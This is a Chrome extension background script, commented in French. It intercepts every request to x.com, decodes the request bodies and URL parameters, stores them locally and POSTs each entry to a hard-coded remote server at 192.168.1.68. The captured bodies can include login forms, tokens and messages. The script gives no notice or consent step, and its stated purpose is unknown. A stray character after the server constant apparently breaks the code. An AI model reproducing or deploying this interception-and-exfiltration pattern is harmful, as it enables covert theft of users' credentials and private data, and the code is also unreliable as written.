const MAX_LOGS = 200;


const REMOTE_SERVER = "http://192.168.1.68:3000/logs"; /

function normalizeUrl(url) {
  try {
    const u = new URL(url);
    return `${u.origin}${u.pathname}`;
  } catch {
    return url;
  }
}

function extractUrlParams(url) {
  try {
    const u = new URL(url);
    const params = {};
    u.searchParams.forEach((value, key) => {
      params[key] = value;
    });
    return Object.keys(params).length > 0 ? params : null;
  } catch {
    return null;
  }
}

function decodeRequestBody(requestBody) {
  if (!requestBody) return null;

  try {
    if (requestBody.formData) {
      const formData = {};
      for (const key in requestBody.formData) {
        formData[key] = requestBody.formData[key].join(', ');
      }
      return { type: 'formData', data: formData };
    }

    if (requestBody.raw && requestBody.raw.length > 0) {
      const raw = requestBody.raw[0];
      if (raw.bytes) {
        const decoder = new TextDecoder('utf-8');
        const text = decoder.decode(raw.bytes);
        
        try {
          const json = JSON.parse(text);
          return { type: 'json', data: json };
        } catch {
          return { type: 'raw', data: text };
        }
      }
    }
  } catch (error) {
    console.error('Erreur lors du décodage du body:', error);
  }

  return null;
}

//  Fonction pour envoyer les données au serveur distant
async function sendToRemote(logEntry) {
  try {
    const response = await fetch(REMOTE_SERVER, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(logEntry)
    });

    if (!response.ok) {
      console.error('Échec envoi:', response.status);
    }
  } catch (error) {
    console.error('Erreur réseau:', error);
    // Ne pas bloquer si le serveur est injoignable
  }
}

chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    const logEntry = {
      time: new Date().toISOString(), // Format ISO pour meilleure compatibilité
      timestamp: Date.now(),
      method: details.method,
      url: normalizeUrl(details.url),
      fullUrl: details.url,
      urlParams: extractUrlParams(details.url),
      requestBody: decodeRequestBody(details.requestBody)
    };

    // Envoyer au serveur distant (async, non-bloquant)
    sendToRemote(logEntry);

    //  Stocker localement aussi
    chrome.storage.local.get({ logs: [] }, ({ logs }) => {
      logs.unshift(logEntry);
      if (logs.length > MAX_LOGS) logs.length = MAX_LOGS;
      chrome.storage.local.set({ logs });
    });
  },
  { urls: ["*://x.com/*", "*://*.x.com/*"] },
  ["requestBody"]

);
